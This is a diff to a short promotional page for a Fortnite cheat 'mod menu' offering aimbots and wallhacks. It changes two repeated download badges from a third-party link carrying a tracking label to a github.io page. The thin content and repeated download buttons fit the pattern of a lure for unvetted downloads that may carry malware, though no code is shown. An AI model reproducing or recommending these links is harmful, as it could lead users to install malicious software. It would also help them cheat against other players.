@@ -2,7 +2,7 @@
 
 A **Fortnite Mod Menu** is a third-party modification that allows players to access cheats and custom features in the game. These mods can include a variety of enhancements such as:
 
-[![Download Fortnite ModMenu](https://img.shields.io/badge/Download-Fortnite%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Fortnite ModMenu](https://img.shields.io/badge/Download-Fortnite%20ModMenu-blueviolet)](https://fortnite-modmenu.github.io/.github/)
 
 - **Aimbots**: Automatically aim at enemies for more accurate shots.
 - **Wallhacks**: See through walls to locate opponents.
@@ -13,4 +13,4 @@ A **Fortnite Mod Menu** is a third-party modification that allows players to acc
 
 These mod menus are created by the community and are typically not supported or endorsed by the official Fortnite developers.
 
-[![Download Fortnite ModMenu](https://img.shields.io/badge/Download-Fortnite%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Fortnite ModMenu](https://img.shields.io/badge/Download-Fortnite%20ModMenu-blueviolet)](https://fortnite-modmenu.github.io/.github/)
